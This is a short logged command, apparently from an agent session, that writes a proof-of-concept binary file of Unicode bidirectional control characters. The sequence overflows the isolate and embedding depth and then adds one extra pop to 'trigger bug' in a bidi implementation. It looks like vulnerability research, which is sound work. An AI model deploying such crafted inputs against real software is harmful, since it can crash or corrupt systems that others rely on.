Running command: cd /tmp && python3 -c "
import struct
RLI=0x2067; LRI=0x2066; PDI=0x2069; RLE=0x202B; PDF=0x202C
seq=[]
# 124 isolates alternating RLI, LRI to raise level to 124
for i in range(124):
    seq.append(RLI if i%2==0 else LRI)
# E1 RLE at level 124 -> level 125
seq.append(RLE)
# E2 RLE at level 125 -> over_pushed=1
seq.append(RLE)
# PDF pops E1, level back to 124
seq.append(PDF)
# I125 valid isolate, counted but not pushed (over_pushed=1)
seq.append(RLI)
# 124 PDIs to pop I124..I1
seq += [PDI]*124
# 1 more PDI to trigger bug
seq += [PDI]
data = b''.join(struct.pack('<I', c) for c in seq)
open('/tmp/poc_iso2.bin','wb').write(data)
print('wrote', len(data), 'bytes,', len(seq), 'chars')
"
